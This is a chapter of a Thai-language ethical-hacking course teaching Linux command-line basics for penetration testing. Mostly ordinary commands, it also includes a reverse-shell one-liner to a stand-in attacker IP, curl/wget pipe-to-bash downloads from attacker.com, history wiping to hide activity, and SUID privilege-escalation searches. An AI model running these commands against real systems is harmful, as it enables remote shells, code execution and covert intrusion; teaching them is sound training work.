# Part 02: Linux Command Line Fundamentals - คำสั่ง Linux พื้นฐาน

## สารบัญ
- [ทำไมต้องรู้ Command Line?](#ทำไมต้องรู้-command-line)
- [Navigation Commands](#navigation-commands)
- [File Operations](#file-operations)
- [Text Processing](#text-processing)
- [Process Management](#process-management)
- [Network Commands](#network-commands)
- [User & Permission Management](#user--permission-management)
- [Piping & Redirection](#piping--redirection)
- [Useful Tips](#useful-tips)

---

## ทำไมต้องรู้ Command Line?

ใน Penetration Testing คุณจะใช้ command line **90% ของเวลาทั้งหมด** เหตุผล:

1. **ความเร็ว** - คำสั่งรันเร็วกว่า GUI มาก
2. **Automation** - สร้าง scripts ทำงานอัตโนมัติ
3. **Flexibility** - ทำอะไรก็ได้ที่ GUI ทำไม่ได้
4. **Remote Access** - ส่วนใหญ่ใช้งานผ่าน SSH ไม่มี GUI
5. **Tool Integration** - เครื่องมือ security ส่วนใหญ่เป็น CLI

---

## Navigation Commands

### pwd - Print Working Directory

```bash
# แสดง directory ปัจจุบัน
pwd

# Output:
/home/kali
```

### ls - List Files

```bash
# แสดงไฟล์ใน directory ปัจจุบัน
ls

# แสดงแบบละเอียด
ls -l

# แสดงไฟล์ hidden (เริ่มด้วย .)
ls -a

# รวม: แสดงแบบละเอียดรวมไฟล์ hidden
ls -la

# เรียงตาม size
ls -lS

# เรียงตาม time modified
ls -lt

# แสดงขนาดแบบ human-readable
ls -lh

# ดู directory อื่น
ls -la /etc/
ls -la /var/log/
```

**Output ตัวอย่าง:**
```
total 48
drwxr-xr-x  8 kali kali 4096 Jan 15 10:00 .
drwxr-xr-x 27 root root 4096 Jan 15 09:00 ..
-rw-r--r--  1 kali kali  220 Jan 15 09:00 .bash_logout
-rw-r--r--  1 kali kali 3526 Jan 15 09:00 .bashrc
drwxr-xr-x  2 kali kali 4096 Jan 15 10:00 Desktop
drwxr-xr-x  2 kali kali 4096 Jan 15 10:00 Documents
```

**อธิบาย permissions:**
```
-rwxr-xr-x  owner group  size  date    filename
│├──┤├──┤├──┤
│ │   │   └─ others: r-x (read, execute)
│ │   └───── group:  r-x (read, execute)
│ └───────── owner:  rwx (read, write, execute)
└─────────── type: - (file), d (directory), l (link)
```

### cd - Change Directory

```bash
# ไปที่ directory ที่ระบุ
cd /etc
cd Documents

# ไปที่ home directory
cd ~
cd

# ไปที่ parent directory
cd ..

# ไปที่ directory ก่อนหน้า
cd -

# ตัวอย่างการใช้งานจริง
cd /usr/share/wordlists
ls -lh
```

### find - ค้นหาไฟล์

```bash
# ค้นหาตามชื่อ
find / -name "passwd"
find /home -name "*.txt"

# ค้นหาตาม type
find / -type f -name "config.php"  # ไฟล์
find / -type d -name "backup"      # directory

# ค้นหาตาม permission (SUID files - สำคัญสำหรับ privesc)
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null

# ค้นหาตาม size
find / -size +10M  # มากกว่า 10MB
find / -size -1k   # น้อยกว่า 1KB

# ค้นหาตาม modification time
find / -mtime -7   # แก้ไขใน 7 วันล่าสุด
find / -mmin -60   # แก้ไขใน 60 นาทีล่าสุด

# ค้นหา world-writable files
find / -perm -o=w -type f 2>/dev/null

# ค้นหาแล้วทำอะไรบางอย่าง
find /tmp -name "*.sh" -exec chmod +x {} \;
```

### locate - ค้นหาเร็ว

```bash
# อัปเดต database ก่อน
sudo updatedb

# ค้นหาไฟล์
locate passwd
locate rockyou.txt
locate *.conf
```

### which / whereis - หา Location ของ Command

```bash
# หา path ของ executable
which nmap
# Output: /usr/bin/nmap

which python3
# Output: /usr/bin/python3

# ข้อมูลละเอียดกว่า
whereis nmap
# Output: nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz
```

---

## File Operations

### cat - อ่านไฟล์

```bash
# อ่านไฟล์
cat /etc/passwd
cat /etc/hosts

# อ่านหลายไฟล์
cat file1.txt file2.txt

# แสดง line numbers
cat -n /etc/passwd

# อ่านกลับหัว (tail ถึง head)
tac /etc/passwd
```

**ไฟล์สำคัญที่ต้องรู้:**
```bash
cat /etc/passwd      # รายชื่อ users
cat /etc/shadow      # Password hashes (ต้อง root)
cat /etc/group       # Groups
cat /etc/hosts       # Hostname mappings
cat /etc/resolv.conf # DNS configuration
cat /proc/version    # Kernel version
cat /proc/net/tcp    # TCP connections
```

### head / tail - อ่านบางส่วน

```bash
# อ่าน 10 บรรทัดแรก
head /etc/passwd

# อ่าน N บรรทัดแรก
head -n 20 /etc/passwd

# อ่าน 10 บรรทัดสุดท้าย
tail /var/log/auth.log

# ติดตาม log แบบ real-time
tail -f /var/log/syslog
tail -f /var/log/apache2/access.log
```

### less / more - อ่านแบบ Page

```bash
less /etc/passwd
# Navigation: j/k = scroll, q = quit, / = search, n = next match

more /etc/passwd
# Space = next page, q = quit
```

### cp - Copy

```bash
# copy ไฟล์
cp file.txt /tmp/
cp file.txt newname.txt

# copy directory (-r = recursive)
cp -r /etc/apache2 /tmp/apache2-backup

# copy พร้อม preserve permissions
cp -p important.conf /backup/

# copy และ verbose
cp -v file.txt /tmp/
```

### mv - Move/Rename

```bash
# rename
mv oldname.txt newname.txt

# ย้ายไฟล์
mv file.txt /tmp/

# ย้าย directory
mv /tmp/olddir /home/kali/newdir
```

### rm - Delete

```bash
# ลบไฟล์
rm file.txt

# ลบโดยไม่ถาม
rm -f file.txt

# ลบ directory (recursive)
rm -rf /tmp/old_directory

# ลบ verbose
rm -v file.txt
```

### mkdir - Create Directory

```bash
# สร้าง directory
mkdir myproject

# สร้าง nested directories
mkdir -p project/src/modules

# สร้าง directory พร้อม permissions
mkdir -m 700 secrets
```

### touch - Create/Update File

```bash
# สร้างไฟล์ว่าง
touch newfile.txt

# อัปเดต timestamp
touch existingfile.txt

# สร้างหลายไฟล์
touch file1.txt file2.txt file3.txt
```

### chmod - Change Permissions

```bash
# Numeric method
chmod 755 script.sh    # rwxr-xr-x
chmod 644 config.txt   # rw-r--r--
chmod 700 private.key  # rwx------
chmod 777 public.txt   # rwxrwxrwx (ไม่แนะนำ)

# Symbolic method
chmod +x script.sh     # เพิ่ม execute ทุกคน
chmod u+x script.sh    # เพิ่ม execute เฉพาะ owner
chmod g-w file.txt     # ลบ write จาก group
chmod o-r secret.txt   # ลบ read จาก others

# SUID/SGID/Sticky bit
chmod u+s binary       # Set SUID
chmod g+s directory    # Set SGID
chmod +t /tmp          # Sticky bit

# Permission table
# 4 = read (r)
# 2 = write (w)
# 1 = execute (x)
# 7 = rwx (4+2+1)
# 6 = rw- (4+2)
# 5 = r-x (4+1)
# 4 = r-- (4)
```

### chown - Change Owner

```bash
# เปลี่ยน owner
chown kali file.txt

# เปลี่ยน owner:group
chown kali:kali file.txt

# เปลี่ยน recursive
chown -R kali:kali /home/kali/
```

### ln - Create Links

```bash
# Hard link
ln original.txt hardlink.txt

# Symbolic link (soft link)
ln -s /etc/hosts /tmp/hosts_link
ls -la /tmp/hosts_link

# ตัวอย่างการใช้งาน
ln -s /usr/share/wordlists/rockyou.txt.gz ~/rockyou.txt.gz
```

---

## Text Processing

### grep - Search Text

```bash
# ค้นหา pattern ในไฟล์
grep "root" /etc/passwd
grep "error" /var/log/syslog

# Case insensitive
grep -i "password" config.php

# Recursive ค้นทุกไฟล์ใน directory
grep -r "password" /var/www/html/

# แสดง line numbers
grep -n "root" /etc/passwd

# แสดง N lines รอบๆ match
grep -C 3 "error" log.txt   # 3 lines before & after
grep -A 3 "error" log.txt   # 3 lines after
grep -B 3 "error" log.txt   # 3 lines before

# Invert match (แสดงบรรทัดที่ไม่ match)
grep -v "#" /etc/hosts
grep -v "^#" config.txt  # ลบ comment lines

# ค้นหา multiple patterns
grep -E "error|warning|fail" log.txt

# Count matches
grep -c "failed" /var/log/auth.log

# แสดงเฉพาะชื่อไฟล์
grep -l "password" /var/www/html/*.php

# Regex ขั้นสูง
grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" log.txt  # IP addresses
grep -oP '(?<=password=)[^&]+' url.txt  # Extract after "password="
```

### sed - Stream Editor

```bash
# แทนที่ text
sed 's/old/new/' file.txt           # แทนที่ครั้งแรก
sed 's/old/new/g' file.txt          # แทนที่ทั้งหมด
sed -i 's/old/new/g' file.txt       # แก้ไขไฟล์ตรงๆ

# ลบบรรทัด
sed '/pattern/d' file.txt
sed '/^#/d' config.txt              # ลบ comments

# แสดงบรรทัดที่ N
sed -n '5p' file.txt               # บรรทัดที่ 5
sed -n '5,10p' file.txt            # บรรทัดที่ 5-10

# เพิ่มบรรทัด
sed '1i\# Added by script' file.txt  # เพิ่มต้นไฟล์
sed '$a\# End of file' file.txt      # เพิ่มท้ายไฟล์

# ตัวอย่างการใช้งานจริง
# ลบ blank lines
sed '/^$/d' file.txt

# แทนที่ IP
sed 's/192.168.1.100/10.10.10.5/g' config.txt
```

### awk - Text Processing

```bash
# แสดง column ที่ 1
awk '{print $1}' file.txt

# แสดง column ที่ 1 และ 3
awk '{print $1, $3}' file.txt

# ดึงข้อมูลจาก /etc/passwd (field delimiter :)
awk -F: '{print $1}' /etc/passwd           # แสดงเฉพาะ usernames
awk -F: '{print $1, $3}' /etc/passwd       # username และ UID
awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # users ที่ UID >= 1000

# Filter based on pattern
awk '/root/ {print}' /etc/passwd

# คำนวณ
awk '{sum += $1} END {print sum}' numbers.txt

# Count lines
awk 'END {print NR}' file.txt

# ตัวอย่างจริง: ดึง IPs จาก log
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10
```

### cut - Extract Columns

```bash
# ตัดตาม delimiter
cut -d: -f1 /etc/passwd          # ดึง field 1
cut -d: -f1,3 /etc/passwd        # ดึง field 1 และ 3
cut -d, -f2 csv_file.csv         # CSV field 2

# ตัดตาม character position
cut -c1-10 file.txt              # 10 ตัวแรก
cut -c5- file.txt                # ตั้งแต่ตัวที่ 5
```

### sort - เรียงลำดับ

```bash
# เรียงตาม alphabet
sort file.txt

# เรียงกลับ
sort -r file.txt

# เรียงตาม number
sort -n numbers.txt

# เรียงตาม column ที่ N
sort -k2 -n file.txt

# เรียงและลบ duplicates
sort -u file.txt

# ตัวอย่าง: เรียง IP addresses
sort -t. -k1,1n -k2,2n -k3,3n -k4,4n ip_list.txt
```

### uniq - Remove Duplicates

```bash
# ลบ duplicates (ต้องเรียงก่อน)
sort file.txt | uniq

# นับจำนวน
sort file.txt | uniq -c

# แสดงเฉพาะที่ซ้ำ
sort file.txt | uniq -d

# แสดงเฉพาะที่ไม่ซ้ำ
sort file.txt | uniq -u

# ตัวอย่างจริง: Top 10 IPs ที่ hit มากที่สุด
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
```

### wc - Word Count

```bash
# นับบรรทัด
wc -l file.txt

# นับคำ
wc -w file.txt

# นับ characters
wc -c file.txt

# ดูขนาด wordlist
wc -l /usr/share/wordlists/rockyou.txt
# Output: 14344392 /usr/share/wordlists/rockyou.txt
```

### tr - Translate Characters

```bash
# แปลงตัวพิมพ์ใหญ่เป็นเล็ก
echo "HELLO WORLD" | tr 'A-Z' 'a-z'

# ลบ characters
echo "hello world" | tr -d ' '

# แทนที่ characters
echo "hello:world" | tr ':' ' '

# Squeeze repeating characters
echo "aabbcc" | tr -s 'a-z'
```

---

## Process Management

### ps - Process Status

```bash
# ดู processes ปัจจุบัน
ps aux

# ดูแบบ tree
ps auxf

# ค้นหา process
ps aux | grep nginx
ps aux | grep python

# ดูเฉพาะ process ของ user
ps -u kali

# ดู process ที่ใช้ CPU มากที่สุด
ps aux --sort=-%cpu | head -10

# ดู process ที่ใช้ RAM มากที่สุด
ps aux --sort=-%mem | head -10
```

### top / htop - Real-time Monitor

```bash
# Monitor real-time
top
# Shortcuts: q=quit, k=kill, r=renice, 1=per CPU

# htop (ดีกว่า, ต้องติดตั้ง)
htop
# ติดตั้ง: sudo apt install htop
```

### kill - ยุติ Process

```bash
# Kill process ด้วย PID
kill 1234

# Force kill
kill -9 1234
kill -SIGKILL 1234

# Kill ตามชื่อ
killall python3
pkill -9 metasploit

# ค้นหา PID ก่อน kill
pgrep metasploit
```

### jobs / bg / fg

```bash
# รัน command ใน background
nmap -sV 192.168.1.0/24 &

# ดู background jobs
jobs

# นำ job กลับมา foreground
fg %1

# ส่ง job ไป background
bg %1

# Suspend current process
# กด Ctrl+Z แล้วใช้ bg
```

### screen / tmux - Terminal Multiplexer

```bash
# screen - สำคัญสำหรับ long-running operations
screen -S mysession         # สร้าง session ชื่อ mysession
screen -ls                  # ดู sessions
screen -r mysession         # กลับเข้า session
# Ctrl+A, D = detach จาก session

# tmux (แนะนำ)
tmux new -s mysession       # สร้าง session
tmux ls                     # ดู sessions
tmux attach -t mysession    # กลับเข้า session
# Ctrl+B, D = detach
# Ctrl+B, % = split vertical
# Ctrl+B, " = split horizontal
# Ctrl+B, arrow = เปลี่ยน pane
```

---

## Network Commands

### ip - Network Interface

```bash
# ดู IP addresses
ip addr show
ip a  # short form

# ดู routing table
ip route show
ip r  # short form

# ดู specific interface
ip addr show eth0

# ตั้งค่า IP
sudo ip addr add 192.168.1.100/24 dev eth0

# เปิด/ปิด interface
sudo ip link set eth0 up
sudo ip link set eth0 down

# เพิ่ม route
sudo ip route add 10.10.10.0/24 via 192.168.1.1
```

### ping - Test Connectivity

```bash
# Ping
ping google.com
ping -c 4 192.168.1.1    # 4 packets เท่านั้น
ping -i 0.2 target.com  # ส่งทุก 0.2 วินาที

# Sweep network (ค้นหา hosts)
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up"; done
```

### netstat / ss - Network Statistics

```bash
# ดู open ports
ss -tuln
netstat -tuln

# ดู established connections
ss -tn
netstat -tn

# ดูกับ process names
ss -tulpn
netstat -tulpn

# ดู listening services
ss -lntp

# ดู UDP
ss -ulnp
```

### curl - HTTP Client

```bash
# GET request
curl http://example.com
curl -s http://example.com  # silent (ไม่แสดง progress)

# GET พร้อม headers
curl -I http://example.com  # Headers only
curl -v http://example.com  # Verbose

# POST request
curl -X POST -d "username=admin&password=test" http://example.com/login

# Headers
curl -H "Content-Type: application/json" http://api.example.com

# Follow redirects
curl -L http://example.com

# Save to file
curl -o output.html http://example.com
curl -O http://example.com/file.zip

# Authentication
curl -u username:password http://example.com

# JSON
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://api.example.com

# ตัวอย่างจริง: ทดสอบ web server
curl -sv http://192.168.1.100/
curl -sv --max-time 5 http://192.168.1.100/admin
```

### wget - Download Files

```bash
# Download file
wget http://example.com/file.zip

# Download ไปที่ specific location
wget -O /tmp/file.zip http://example.com/file.zip

# Download recursive
wget -r http://example.com/

# Resume download
wget -c http://example.com/largefile.iso

# ตัวอย่าง: download tools
wget https://github.com/user/tool/archive/main.zip
```

### nc (netcat) - Swiss Army Knife

```bash
# Banner grabbing
nc -v 192.168.1.100 80
nc -v target.com 22

# Listen (server mode)
nc -lvnp 4444

# Connect (client mode)
nc target.com 4444

# File transfer
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc -v receiver_ip 4444 < file_to_send

# Port scanning
nc -zvn 192.168.1.100 1-1000

# Reverse shell listener
nc -lvnp 4444
# จากเป้าหมาย:
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

---

## User & Permission Management

### User Commands

```bash
# ดู user ปัจจุบัน
whoami
id

# ดู users ทั้งหมด
cat /etc/passwd | awk -F: '{print $1}'

# ดู groups
groups
id username

# Switch user
su root
su - kali  # login shell

# sudo
sudo command         # รัน command เป็น root
sudo -i              # shell เป็น root
sudo -u user command  # รัน command เป็น user อื่น

# สร้าง user
sudo useradd -m newuser
sudo passwd newuser

# ลบ user
sudo userdel -r newuser

# เพิ่ม user เข้า group
sudo usermod -aG sudo newuser
sudo usermod -aG docker kali
```

### Sudo Configuration

```bash
# ดู sudo privileges
sudo -l

# แก้ไข sudoers
sudo visudo

# ตัวอย่าง sudoers entries
# kali ALL=(ALL:ALL) ALL          # สิทธิ์ root ทั้งหมด
# kali ALL=(ALL) NOPASSWD: ALL    # ไม่ต้องใส่ password
```

---

## Piping & Redirection

### Pipes (|)

```bash
# ส่ง output ของ command หนึ่งไปยังอีก command
ls -la | grep ".txt"
ps aux | grep python
cat /etc/passwd | awk -F: '{print $1}' | sort

# ตัวอย่างจริง:
nmap -sn 192.168.1.0/24 | grep "Nmap scan report" | awk '{print $5}'
```

### Redirection

```bash
# Output to file (overwrite)
ls -la > output.txt
nmap -sV target.com > scan_results.txt

# Output to file (append)
echo "Additional info" >> output.txt
nmap -sV target.com >> scan_results.txt

# Input from file
sort < unsorted.txt

# Error to file
nmap target.com 2> errors.txt

# Both output and error
nmap target.com > output.txt 2>&1
nmap target.com &> all_output.txt  # same as above

# Discard output
nmap target.com 2>/dev/null        # ทิ้ง errors
find / -name passwd 2>/dev/null    # ทั่วไปใช้บ่อยมาก
```

### tee - Split Output

```bash
# แสดงและบันทึกพร้อมกัน
nmap -sV 192.168.1.100 | tee scan_results.txt
nmap -sV 192.168.1.100 | tee -a results.txt  # append
```

### xargs - Build Arguments

```bash
# รัน command กับแต่ละ input
cat hosts.txt | xargs -I{} nmap -sV {}

# parallel
cat hosts.txt | xargs -P 4 -I{} nmap -sV {}

# ตัวอย่างจริง
cat ip_list.txt | xargs -I{} curl -s http://{}/ -o /dev/null -w "%{http_code} {}\n"
```

---

## Useful Tips สำหรับ Hacker

### 1. History Commands

```bash
# ดู command history
history
history | tail -50

# ค้นหา history
history | grep nmap

# รันคำสั่งก่อนหน้า
!!
!nmap   # รันคำสั่ง nmap ล่าสุด
!100    # รัน command ที่ 100

# ล้าง history
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
```

### 2. One-liners ที่มีประโยชน์

```bash
# หา SUID files
find / -perm -u=s -type f 2>/dev/null

# หา writable directories
find / -writable -type d 2>/dev/null

# ดู cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*

# ดู services
ps aux
ss -tulpn

# ดู users ที่ login ได้
cat /etc/passwd | grep -v nologin | grep -v false

# Port scan เร็ว
for p in 21 22 23 25 80 110 139 143 443 445 3306 3389 8080; do
  (echo >/dev/tcp/192.168.1.100/$p) 2>/dev/null && echo "$p open"
done

# ดู environment variables
env
printenv
echo $PATH
echo $HOME
```

### 3. Text Manipulation

```bash
# สร้าง wordlist จาก text
cewl http://target.com -w wordlist.txt

# แปลง Windows line endings
dos2unix file.txt

# Encode/Decode Base64
echo "password" | base64
echo "cGFzc3dvcmQ=" | base64 -d

# Hex encoding
echo "password" | xxd
echo "password" | xxd -p

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('test<script>'))"

# MD5/SHA1/SHA256 hash
echo -n "password" | md5sum
echo -n "password" | sha1sum
echo -n "password" | sha256sum
```

### 4. File Download & Execution

```bash
# Download & execute (one-liner)
curl http://attacker.com/script.sh | bash
wget -O- http://attacker.com/script.sh | bash

# Python HTTP server (ส่งไฟล์)
cd /tmp && python3 -m http.server 8080

# Download จาก target
curl http://192.168.1.100:8080/shell.elf -o /tmp/shell.elf
```

### 5. String Manipulation

```bash
# นับความยาว
echo -n "password" | wc -c

# Reverse string
echo "hello" | rev

# Upper/Lower case
echo "Hello World" | tr '[:lower:]' '[:upper:]'
echo "Hello World" | tr '[:upper:]' '[:lower:]'

# แทนที่ด้วย python
python3 -c "print('hello world'.replace('world', 'hacker'))"
```

---

## Shell Scripting พื้นฐาน

```bash
#!/bin/bash
# Script พื้นฐานสำหรับ Network Scan

# Variables
TARGET="192.168.1.0/24"
OUTPUT="/tmp/scan_$(date +%Y%m%d_%H%M%S)"

# Functions
function banner() {
    echo "================================"
    echo "Network Scanner v1.0"
    echo "================================"
}

# Conditionals
if [ "$EUID" -ne 0 ]; then
    echo "[!] Run as root"
    exit 1
fi

# Loops
banner
echo "[*] Scanning $TARGET..."

for ip in $(seq 1 254); do
    host="192.168.1.$ip"
    ping -c 1 -W 1 $host &>/dev/null && echo "[+] $host is UP" &
done
wait

echo "[*] Scan complete!"
echo "[*] Results: $OUTPUT"
```

---

## แบบฝึกหัด

### แบบฝึกหัดที่ 1: Navigation

```bash
# 1. ไปที่ /etc directory และดู files
cd /etc && ls -la

# 2. ค้นหา configuration files ใน /etc
find /etc -name "*.conf" 2>/dev/null | head -20

# 3. ดูข้อมูล passwd file
cat /etc/passwd | awk -F: '{print $1, $3, $6}'
```

### แบบฝึกหัดที่ 2: Text Processing

```bash
# สร้างไฟล์ทดสอบ
cat > /tmp/users.txt << EOF
root:x:0:0:root:/root:/bin/bash
kali:x:1000:1000:kali:/home/kali:/bin/zsh
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
EOF

# แบบฝึกหัด:
# 1. ดึงเฉพาะ usernames
cut -d: -f1 /tmp/users.txt

# 2. ดึง users ที่มี /bin/bash
grep "bash" /tmp/users.txt | cut -d: -f1

# 3. เรียง และนับ
sort /tmp/users.txt | wc -l
```

### แบบฝึกหัดที่ 3: Network

```bash
# 1. ดู IP address และ network interfaces
ip addr show

# 2. ดู listening ports
ss -tulpn

# 3. Test connectivity
ping -c 4 8.8.8.8
curl -s http://ifconfig.me  # ดู public IP
```

---

## สรุป

| หมวด | Commands ที่สำคัญ |
|------|------------------|
| Navigation | pwd, ls, cd, find, locate |
| Files | cat, cp, mv, rm, chmod, chown |
| Text | grep, sed, awk, cut, sort, uniq |
| Process | ps, kill, top, screen/tmux |
| Network | ip, ping, ss, curl, nc |
| Pipes | \|, >, >>, 2>, tee, xargs |

**Part ถัดไป:** [Part 03: Networking Fundamentals](Part-03-Networking-Fundamentals.md)

---
*Part 02/100 | Kali Linux Course | Ethical Hacking & Penetration Testing*
